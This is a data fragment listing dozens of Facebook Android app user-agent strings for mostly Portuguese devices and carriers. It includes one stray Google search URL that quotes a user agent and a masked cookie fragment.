"[FBAN/FB4A;FBAV/154.0.0.33.385;FBBV/87107448;FBDM/{density=3.0,width=1080,height=1920};FBLC/pt_PT;FBRV/87107448;FBCR/vodafone P;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-N9005;FBSV/5.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/153.0.0.54.88;FBBV/84570982;FBDM/{density=2.0,width=720,height=1184};FBLC/pt_PT;FBRV/85070460;FBCR/altice MEO;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/HUAWEI CUN-L21;FBSV/5.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/153.0.0.54.88;FBBV/84570982;FBDM/{density=2.0,width=720,height=1280};FBLC/pt_PT;FBRV/85070460;FBCR/altice MEO;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00LD;FBSV/6.0.1;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/153.0.0.54.88;FBBV/84570982;FBDM/{density=2.0,width=720,height=1280};FBLC/pt_PT;FBRV/85070460;FBCR/vodafone P;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A500FU;FBSV/6.0.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/153.0.0.54.88;FBBV/84570984;FBDM/{density=2.625,width=1080,height=1920};FBLC/pt_PT;FBRV/84966289;FBCR/NOS;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-J730F;FBSV/7.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/153.0.0.54.88;FBBV/84570984;FBDM/{density=3.0,width=1080,height=1776};FBLC/pt_PT;FBRV/85070460;FBCR/vodafone P;FBMF/WIKO;FBBD/WIKO;FBPN/com.facebook.katana;FBDV/U FEEL PRIME;FBSV/7.1.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/153.0.0.54.88;FBBV/84570978;FBDM/{density=1.5,width=540,height=960};FBLC/en_GB;FBRV/85070460;FBCR/altice MEO;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A300FU;FBSV/6.0.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/153.0.0.54.88;FBBV/84570982;FBDM/{density=2.0,width=720,height=1280};FBLC/pt_PT;FBRV/85070460;FBCR/NOS;FBMF/TCL;FBBD/TCL;FBPN/com.facebook.katana;FBDV/5056D;FBSV/6.0.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/153.0.0.54.88;FBBV/84570984;FBDM/{density=3.0,width=1080,height=1812};FBLC/pt_PT;FBRV/85070460;FBCR/NOS;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/PRA-LX1;FBSV/7.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/148.0.0.51.62;FBBV/78217111;FBDM/{density=3.0,width=1080,height=1776};FBLC/pt_PT;FBRV/78767892;FBCR/vodafone P;FBMF/WIKO;FBBD/WIKO;FBPN/com.facebook.katana;FBDV/FEVER;FBSV/6.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/153.0.0.54.88;FBBV/84570982;FBDM/{density=2.0,width=720,height=1280};FBLC/pt_PT;FBRV/85070460;FBCR/;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/Redmi 3;FBSV/5.1.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/153.0.0.54.88;FBBV/84570982;FBDM/{density=2.0,width=720,height=1280};FBLC/pt_PT;FBRV/85070460;FBCR/vodafone P;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-J500F;FBSV/6.0.1;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/153.0.0.54.88;FBBV/84570982;FBDM/{density=2.0,width=720,height=1184};FBLC/pt_PT;FBRV/85070460;FBCR/vodafone P;FBMF/ZTE;FBBD/ZTE;FBPN/com.facebook.katana;FBDV/ZTE BLADE A512;FBSV/6.0.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/153.0.0.54.88;FBBV/84570982;FBDM/{density=2.0,width=720,height=1280};FBLC/pt_PT;FBRV/85070460;FBCR/NOS;FBMF/TCL;FBBD/TCL;FBPN/com.facebook.katana;FBDV/5054X;FBSV/5.1.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/151.0.0.44.205;FBBV/81374851;FBDM/{density=2.0,width=720,height=1187};FBLC/pt_PT;FBRV/82651122;FBCR/MEO;FBMF/LGE;FBBD/lge;FBPN/com.facebook.katana;FBDV/LG-H502;FBSV/6.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/151.0.0.44.205;FBBV/81374851;FBDM/{density=2.0,width=720,height=1280};FBLC/pt_PT;FBRV/82651122;FBCR/NOS;FBMF/ZTE;FBBD/ZTE;FBPN/com.facebook.katana;FBDV/NOS FIVE;FBSV/5.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/153.0.0.54.88;FBBV/84570982;FBDM/{density=2.0,width=720,height=1280};FBLC/pt_PT;FBRV/85070460;FBCR/NOS;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-J500F;FBSV/5.1.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/153.0.0.54.88;FBBV/84570984;FBDM/{density=3.0,width=1080,height=1920};FBLC/pt_PT;FBRV/84570984;FBCR/MEO;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G935F;FBSV/7.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/153.0.0.53.88;FBBV/84425344;FBDM/{density=1.5,width=540,height=960};FBLC/pt_PT;FBRV/84425344;FBCR/;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G530FZ;FBSV/5.0.2;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/153.0.0.54.88;FBBV/84570982;FBDM/{density=2.0,width=720,height=1184};FBLC/pt_PT;FBRV/85070460;FBCR/;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_X008D;FBSV/7.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/159.0.0.38.95;FBBV/91889140;FBDM/{density=1.0,width=1280,height=752};FBLC/pt_PT;FBRV/92233038;FBCR/;FBMF/LENOVO;FBBD/Lenovo;FBPN/com.facebook.katana;FBDV/Lenovo TB-X103F;FBSV/6.0.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/153.0.0.54.88;FBBV/84570982;FBDM/{density=2.0,width=720,height=1280};FBLC/pt_PT;FBRV/85070460;FBCR/altice MEO;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-J320F;FBSV/5.1.1;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/154.0.0.33.385;FBBV/87107435;FBDM/{density=2.0,width=720,height=1280};FBLC/pt_PT;FBRV/87107435;FBCR/vodafone P;FBMF/TCL;FBBD/TCL;FBPN/com.facebook.katana;FBDV/5056D;FBSV/6.0.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/153.0.0.54.88;FBBV/84570984;FBDM/{density=3.0,width=1080,height=1920};FBLC/pt_PT;FBRV/85070460;FBCR/vodafone P;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A510F;FBSV/7.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/153.0.0.54.88;FBBV/84570982;FBDM/{density=2.0,width=720,height=1184};FBLC/pt_PT;FBRV/85070460;FBCR/MEO;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/HUAWEI CUN-L01;FBSV/5.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/153.0.0.54.88;FBBV/84570982;FBDM/{density=2.0,width=720,height=1184};FBLC/pt_PT;FBRV/85070460;FBCR/NOS;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/HUAWEI TAG-L21;FBSV/5.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/153.0.0.54.88;FBBV/84570978;FBDM/{density=1.5,width=480,height=800};FBLC/pt_PT;FBRV/85070460;FBCR/;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G361F;FBSV/5.1.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/151.0.0.44.205;FBBV/81374851;FBDM/{density=2.0,width=720,height=1280};FBLC/pt_PT;FBRV/82651122;FBCR/vodafone P;FBMF/Vodafone;FBBD/Vodafone;FBPN/com.facebook.katana;FBDV/VFD 600;FBSV/6.0.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/153.0.0.54.88;FBBV/84570982;FBDM/{density=2.0,width=720,height=1280};FBLC/pt_PT;FBRV/85070460;FBCR/NOS;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-J530F;FBSV/7.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/153.0.0.54.88;FBBV/84570982;FBDM/{density=2.0,width=720,height=1280};FBLC/pt_PT;FBRV/85070460;FBCR/vodafone P;FBMF/HMD Global;FBBD/Nokia;FBPN/com.facebook.katana;FBDV/TA-1020;FBSV/7.1.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/153.0.0.54.88;FBBV/84570978;FBDM/{density=1.5,width=480,height=854};FBLC/pt_PT;FBRV/85070460;FBCR/altice MEO;FBMF/WIKO;FBBD/WIKO;FBPN/com.facebook.katana;FBDV/LENNY2;FBSV/5.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/153.0.0.54.88;FBBV/84570984;FBDM/{density=3.0,width=1080,height=1812};FBLC/pt_PT;FBRV/85070460;FBCR/altice MEO;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/WAS-LX1A;FBSV/7.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/153.0.0.54.88;FBBV/84570982;FBDM/{density=2.0,width=720,height=1280};FBLC/pt_PT;FBRV/85070460;FBCR/altice MEO;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-J530F;FBSV/7.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/153.0.0.54.88;FBBV/84570978;FBDM/{density=1.5,width=1200,height=1920};FBLC/pt_PT;FBRV/85070460;FBCR/;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-T580;FBSV/7.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/153.0.0.54.88;FBBV/84570984;FBDM/{density=2.625,width=1080,height=2034};FBLC/en_GB;FBRV/85070460;FBCR/altice MEO;FBMF/OnePlus;FBBD/OnePlus;FBPN/com.facebook.katana;FBDV/ONEPLUS A5010;FBSV/7.1.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/154.0.0.33.385;FBBV/87107448;FBDM/{density=3.0,width=1080,height=1794};FBLC/pt_PT;FBRV/87107448;FBCR/WTF;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/EVA-L09;FBSV/7.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/153.0.0.54.88;FBBV/84570984;FBDM/{density=3.0,width=1920,height=1080};FBLC/pt_PT;FBRV/85070460;FBCR/vodafone P;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/GT-I9505;FBSV/5.0.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/153.0.0.54.88;FBBV/84570984;FBDM/{density=2.625,width=1080,height=2094};FBLC/ru_RU;FBRV/85070460;FBCR/NOS;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G955F;FBSV/7.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/153.0.0.54.88;FBBV/84570982;FBDM/{density=2.0,width=720,height=1208};FBLC/pt_PT;FBRV/85070460;FBCR/NOS;FBMF/HUAWEI;FBBD/Huawei;FBPN/com.facebook.katana;FBDV/ALE-L21;FBSV/6.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/153.0.0.54.88;FBBV/84570982;FBDM/{density=2.0,width=720,height=1184};FBLC/pt_PT;FBRV/85070460;FBCR/altice MEO;FBMF/Sony;FBBD/Sony;FBPN/com.facebook.katana;FBDV/G3121;FBSV/7.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/149.0.0.40.71;FBBV/79007703;FBDM/{density=2.0,width=720,height=1280};FBLC/pt_PT;FBRV/79424004;FBCR/vodafone P;FBMF/Vodafone;FBBD/Vodafone;FBPN/com.facebook.katana;FBDV/VFD 600;FBSV/6.0.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/153.0.0.54.88;FBBV/84570982;FBDM/{density=2.0,width=720,height=1280};FBLC/pt_PT;FBRV/85070460;FBCR/;FBMF/TP-Link;FBBD/Neffos;FBPN/com.facebook.katana;FBDV/Neffos X1;FBSV/7.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/154.0.0.33.385;FBBV/87107435;FBDM/{density=1.75,width=720,height=1280};FBLC/pt_PT;FBRV/87595196;FBCR/altice MEO;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-J530F;FBSV/7.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/160.0.0.30.94;FBBV/93146056;FBDM/{density=3.0,width=1080,height=1776};FBLC/pt_PT;FBRV/93722336;FBCR/altice MEO;FBMF/Sony;FBBD/Sony;FBPN/com.facebook.katana;FBDV/C6903;FBSV/5.1.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/160.0.0.30.94;FBBV/93146050;FBDM/{density=1.5,width=854,height=480};FBLC/pt_PT;FBRV/93722336;FBCR/altice MEO;FBMF/WIKO;FBBD/WIKO;FBPN/com.facebook.katana;FBDV/FREDDY;FBSV/6.0.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/153.0.0.54.88;FBBV/84570984;FBDM/{density=4.0,width=1440,height=2560};FBLC/pt_PT;FBRV/85070460;FBCR/NOWO;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-N910F;FBSV/6.0.1;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/153.0.0.54.88;FBBV/84570984;FBDM/{density=3.0,width=1080,height=1812};FBLC/pt_PT;FBRV/85070460;FBCR/vodafone P;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/VTR-L09;FBSV/7.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/153.0.0.54.88;FBBV/84570984;FBDM/{density=4.0,width=1440,height=2560};FBLC/pt_PT;FBRV/85070460;FBCR/vodafone P;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-N910F;FBSV/6.0.1;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/153.0.0.54.88;FBBV/84570978;FBDM/{density=1.5,width=540,height=960};FBLC/pt_PT;FBRV/84966289;FBCR/altice MEO;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G531F;FBSV/5.1.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/153.0.0.54.88;FBBV/84570982;FBDM/{density=2.0,width=720,height=1280};FBLC/pt_PT;FBRV/85070460;FBCR/vodafone P;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-J320FN;FBSV/5.1.1;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/151.0.0.44.205;FBBV/81374841;FBDM/{density=1.5,width=480,height=854};FBLC/pt_PT;FBRV/82651122;FBCR/altice MEO;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_X00BD;FBSV/5.1.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/153.0.0.54.88;FBBV/84570975;FBDM/{density=1.0,width=768,height=1024};FBLC/pt_PT;FBRV/85070460;FBCR/;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-T550;FBSV/7.1.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/153.0.0.54.88;FBBV/84570982;FBDM/{density=2.0,width=720,height=1280};FBLC/pt_PT;FBRV/85070460;FBCR/altice MEO;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00ED;FBSV/6.0.1;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/159.0.0.38.95;FBBV/91889149;FBDM/{density=3.0,width=1080,height=1794};FBLC/pt_PT;FBRV/92451898;FBCR/vodafone P;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/EVA-L09;FBSV/7.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/153.0.0.54.88;FBBV/84570982;FBDM/{density=2.0,width=720,height=1208};FBLC/pt_PT;FBRV/85070460;FBCR/altice MEO;FBMF/HUAWEI;FBBD/Huawei;FBPN/com.facebook.katana;FBDV/ALE-L21;FBSV/6.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/152.0.0.42.136;FBBV/83110608;FBDM/{density=1.5,width=540,height=960};FBLC/pt_PT;FBRV/84252196;FBCR/altice MEO;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G531F;FBSV/5.1.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/163.0.0.43.91;FBBV/96845985;FBDM/{density=1.5,width=540,height=960};FBLC/pt_PT;FBRV/97737839;FBCR/NOS;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G531F;FBSV/5.1.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/153.0.0.54.88;FBBV/84570982;FBDM/{density=2.0,width=720,height=1184};FBLC/pt_PT;FBRV/85070460;FBCR/vodafone P;FBMF/ulefone;FBBD/ulefone;FBPN/com.facebook.katana;FBDV/MIX;FBSV/7.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/149.0.0.40.71;FBBV/79007703;FBDM/{density=2.0,width=720,height=1280};FBLC/pt_PT;FBRV/79424004;FBCR/vodafone P;FBMF/ZTE;FBBD/ZTE;FBPN/com.facebook.katana;FBDV/NOS NOVU II;FBSV/5.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/153.0.0.54.88;FBBV/84570982;FBDM/{density=2.0,width=720,height=1208};FBLC/pt_PT;FBRV/85070460;FBCR/altice MEO;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/CAM-L21;FBSV/6.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/153.0.0.54.88;FBBV/84570984;FBDM/{density=3.0,width=1080,height=2040};FBLC/pt_PT;FBRV/85070460;FBCR/NOS;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/RNE-L21;FBSV/7.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/154.0.0.33.385;FBBV/87107435;FBDM/{density=2.0,width=720,height=1280};FBLC/pt_PT;FBRV/87107435;FBCR/vodafone P;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-J500F;FBSV/6.0.1;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"https://www.google.com/search?q=Browser+Mozilla/5.0+(Linux%3B+Android+6.0.1%3B+SM-J500F+Build/MMB29M%3B+wv)+AppleWebKit/537.36+(KHTML,+like+Gecko)+Version/4.0+Chrome/68.0.3440.91+Mobile+Safari/537.36+%5BFBAN/FB4A%3BFBAV/185.0.0.39.72%3BFBBV/120757039%3BFBDM/%7Bdensity%3D2.0,width%3D720,height%3D1280%7D%3BFBLC/en_US%3BFBRV/120980177%3BFB_FW/2%3BFBCR/+Cell+C%3BFBMF/samsung%3BFBBD/samsung%3BFBPN/com.facebook.katana%3BFBDV/SM-J500F%3BFBSV/6.0.1%3BFBOP/19%3BFBCA/armeabi-v7a:armeabi%3B%5D+Cookie+xl0p**********",
"[FBAN/FB4A;FBAV/153.0.0.54.88;FBBV/84570982;FBDM/{density=2.0,width=1280,height=720};FBLC/pt_PT;FBRV/85070460;FBCR/altice MEO;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-J510FN;FBSV/7.1.1;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/153.0.0.54.88;FBBV/84570984;FBDM/{density=3.0,width=1080,height=1776};FBLC/pt_PT;FBRV/85070460;FBCR/altice MEO;FBMF/TCL;FBBD/TCL;FBPN/com.facebook.katana;FBDV/6055K;FBSV/6.0.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/165.0.0.53.93;FBBV/99791899;FBDM/{density=2.0,width=720,height=1280};FBLC/pt_PT;FBRV/100707343;FBCR/vodafone P;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-J320F;FBSV/5.1.1;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/152.0.0.42.136;FBBV/83110613;FBDM/{density=3.0,width=1080,height=1776};FBLC/pt_PT;FBRV/84252196;FBCR/NOS;FBMF/TCL;FBBD/TCL;FBPN/com.facebook.katana;FBDV/6045Y;FBSV/6.0.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/161.0.0.35.93;FBBV/94117312;FBDM/{density=3.0,width=1080,height=1920};FBLC/pt_PT;FBRV/94628452;FBCR/;FBMF/Vodafone;FBBD/Vodafone;FBPN/com.facebook.katana;FBDV/Vodafone Smart ultra 6;FBSV/6.0.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/153.0.0.54.88;FBBV/84570982;FBDM/{density=2.0,width=720,height=1280};FBLC/pt_PT;FBRV/85070460;FBCR/vodafone P;FBMF/Vodafone;FBBD/Vodafone;FBPN/com.facebook.katana;FBDV/VFD 600;FBSV/6.0.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/155.0.0.36.96;FBBV/87995188;FBDM/{density=2.0,width=720,height=1280};FBLC/pt_PT;FBRV/88494159;FBCR/altice MEO;FBMF/ZTE;FBBD/ZTE;FBPN/com.facebook.katana;FBDV/NOS NOVU II;FBSV/5.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/153.0.0.54.88;FBBV/84570978;FBDM/{density=1.5,width=540,height=888};FBLC/pt_PT;FBRV/85070460;FBCR/NOS;FBMF/Sony;FBBD/Sony;FBPN/com.facebook.katana;FBDV/D2303;FBSV/5.1.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/153.0.0.54.88;FBBV/84570984;FBDM/{density=3.0,width=1080,height=1812};FBLC/pt_PT;FBRV/85070460;FBCR/NOS;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/HUAWEI VNS-L31;FBSV/7.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/153.0.0.54.88;FBBV/84570984;FBDM/{density=3.0,width=1080,height=1812};FBLC/pt_PT;FBRV/85070460;FBCR/vodafone P;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/WAS-LX1A;FBSV/7.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/153.0.0.54.88;FBBV/84570984;FBDM/{density=3.0,width=1080,height=1812};FBLC/pt_PT;FBRV/85070460;FBCR/vodafone P;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/PRA-LX1;FBSV/7.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/153.0.0.54.88;FBBV/84570982;FBDM/{density=2.0,width=720,height=1280};FBLC/pt_PT;FBRV/85070460;FBCR/altice MEO;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-A310F;FBSV/7.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/154.0.0.33.385;FBBV/87107448;FBDM/{density=3.0,width=1080,height=1776};FBLC/pt_PT;FBRV/87107448;FBCR/vodafone P;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/HUAWEI ATH-UL01;FBSV/5.1.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/153.0.0.54.88;FBBV/84570978;FBDM/{density=1.5,width=480,height=854};FBLC/pt_PT;FBRV/85070460;FBCR/altice MEO;FBMF/WIKO;FBBD/WIKO;FBPN/com.facebook.katana;FBDV/Sunny2 Plus;FBSV/7.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/156.0.0.36.100;FBBV/88997452;FBDM/{density=2.0,width=720,height=1280};FBLC/pt_PT;FBRV/89153155;FBCR/altice MEO;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-J320F;FBSV/5.1.1;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/153.0.0.54.88;FBBV/84570984;FBDM/{density=3.0,width=1080,height=1920};FBLC/pt_PT;FBRV/85070460;FBCR/altice MEO;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G935F;FBSV/7.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/153.0.0.54.88;FBBV/84570982;FBDM/{density=2.0,width=720,height=1280};FBLC/pt_BR;FBRV/85070460;FBCR/altice MEO;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/Redmi 4;FBSV/6.0.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/153.0.0.54.88;FBBV/84570982;FBDM/{density=2.0,width=720,height=1280};FBLC/pt_PT;FBRV/85070460;FBCR/NOS;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-J320F;FBSV/5.1.1;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/153.0.0.54.88;FBBV/84570978;FBDM/{density=1.5,width=480,height=854};FBLC/pt_PT;FBRV/85070460;FBCR/vodafone P;FBMF/WIKO;FBBD/WIKO;FBPN/com.facebook.katana;FBDV/JERRY;FBSV/6.0;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/153.0.0.54.88;FBBV/84570984;FBDM/{density=3.5,width=1440,height=2560};FBLC/pt_PT;FBRV/84570984;FBCR/vodafone P;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G935F;FBSV/7.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/155.0.0.36.96;FBBV/87995190;FBDM/{density=3.0,width=1080,height=1920};FBLC/pt_PT;FBRV/87995190;FBCR/NOS;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G935F;FBSV/7.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]",
"[FBAN/FB4A;FBAV/153.0.0.54.88;FBBV/84570982;FBDM/{density=2.0,width=720,height=1280};FBLC/pt_BR;FBRV/85070460;FBCR/MOCHE;FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/Redmi 4X;FBSV/7.1.2;FBOP/1;FBCA/armeabi-v7a:armeabi;]",
